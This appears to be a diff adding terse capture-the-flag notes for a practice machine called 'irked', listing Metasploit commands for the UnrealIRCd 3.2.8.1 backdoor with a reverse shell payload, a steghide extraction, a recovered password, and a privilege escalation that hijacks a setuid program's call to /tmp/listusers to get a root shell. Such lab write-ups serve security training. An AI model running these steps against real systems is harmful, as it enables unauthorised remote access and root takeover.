@@ -1,0 +1,36 @@
+msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
+
+steghide extract -sf irked.jpg
+
+djmardov:Kab6h+m+bbp2J:HG
+
+### PRIVESC ###
+
+djmardov@irked:~$ ls -lah /usr/bin/viewuser
+-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser
+
+djmardov@irked:~$ viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2019-01-15 02:33 (:0)
+djmardov pts/0        2019-01-15 02:33 (10.10.13.0)
+djmardov pts/1        2019-01-15 02:34 (10.10.14.211)
+djmardov pts/2        2019-01-15 02:34 (10.10.15.23)
+djmardov pts/4        2019-01-15 02:38 (10.10.15.23)
+djmardov pts/6        2019-01-15 02:47 (10.10.15.190)
+sh: 1: /tmp/listusers: not found
+
+created setuid_shell.c
+gcc setuid_shell.c -o /tmp/listusers
+djmardov@irked:~$ viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2019-01-15 02:33 (:0)
+djmardov pts/0        2019-01-15 02:33 (10.10.13.0)
+djmardov pts/1        2019-01-15 02:34 (10.10.14.211)
+djmardov pts/2        2019-01-15 02:34 (10.10.15.23)
+djmardov pts/4        2019-01-15 02:38 (10.10.15.23)
+djmardov pts/6        2019-01-15 02:47 (10.10.15.190)
+# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth),1000(djmardov)
